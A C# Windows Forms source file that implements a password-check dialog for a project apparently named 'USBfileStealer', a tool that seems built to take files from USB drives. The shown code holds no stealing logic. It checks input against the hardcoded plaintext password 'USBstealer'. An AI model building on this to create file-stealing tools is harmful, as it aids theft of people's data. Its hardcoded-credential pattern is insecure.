using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace USBfileStealer
{
    public partial class pwdcheck : Form
    {
        public pwdcheck(Icon ico)
        {
            this.Icon = ico;
            InitializeComponent();
        }
        private static bool isTrue = false;
        public bool ReturnIsTrue()
        {
            return isTrue;
        }
        private void pwdcheck_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.DialogResult = DialogResult.OK;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (maskedTextBox1.Text.Length != 0)
                if (maskedTextBox1.Text.Equals("USBstealer"))
                {
                    isTrue = true;
                    this.DialogResult = DialogResult.OK;
                }
                else
                {
                    isTrue = false;
                    Thread.Sleep(1000);
                    checkBox1.Checked = false; maskedTextBox1.Clear();
                }
            else
            {
                isTrue = false;
                Thread.Sleep(1000);
                checkBox1.Checked = false; maskedTextBox1.Clear();
            }
        }
    }
}
